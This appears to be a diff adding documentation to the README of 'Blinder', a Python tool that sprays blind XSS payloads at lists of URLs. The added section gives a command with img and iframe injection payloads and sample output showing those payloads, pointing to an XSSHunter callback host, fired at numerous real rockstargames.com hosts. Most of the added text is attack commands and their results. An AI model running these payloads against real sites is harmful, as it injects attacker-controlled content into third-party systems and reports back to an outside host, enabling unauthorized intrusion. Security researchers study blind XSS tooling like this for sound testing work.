@@ -23,6 +23,7 @@ python3 Blinder.py [ARGS]
 - Using Your Own External Bin Instead Of Just Using XSSHunter
 - Using Your Own Payloads That Could Be Used To Inject Other Payloads For Other Issues
 - Been Able To Allow/Disallow Redirects With Requests
+- You Can Use Multi Payloads With The Requests And Select The Split Char
 - Cleaner Code!
 
 ### How To Use:
@@ -49,6 +50,30 @@ python3 Blinder.py -f URLs.txt -b https://www.example.com/ -r allow -p '"><img s
 ```
 
 - If You Didn't Add a Payload In Any Cases, Blinder Will Auto Set The Default XSSHunter XSS Payload To Use It.
+
+- You Can Use Multi Payloads With The Requests By Adding a Split Char Between Them You Can Select. If You Didn't Add The Split Char The Program Will Auto Set It Into `,` In This Case. To Use Multi Payloads It Will Look Like This
+
+```
+python3 Blinder.py -f URLs.txt -u hacker -r allow -p '"><img src="XXX">','"><iframe src="XXX">' -s ,
+```
+- The Output Will Be Something Like That In This Case.
+
+```
+Request Has Been Sent To: https://scapi.rockstargames.com, Status-Code: 403 , Payload: "><img src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://scapi.rockstargames.com, Status-Code: 403 , Payload: "><iframe src="https://hacker.xss.ht/">
+Request Has Been Sent To: http://scapi.rockstargames.com, Status-Code: 301 , Payload: "><img src="https://hacker.xss.ht/">
+Request Has Been Sent To: http://scapi.rockstargames.com, Status-Code: 301 , Payload: "><iframe src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://prod.p01ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://prod.p01ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://prod.p02sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://prod.p02sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://prod.p02ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://prod.p02ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://warehouse.rockstargames.com, Status-Code: 302 , Payload: "><img src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://warehouse.rockstargames.com, Status-Code: 302 , Payload: "><iframe src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://prod.p01sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
+Request Has Been Sent To: https://prod.p01sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
+```
 
 ### Something Isn't Working Or You Want To Improve Something?
 - Then Please Open an Issue With It Or You Can Fork The Project Then Create a Pull Request.
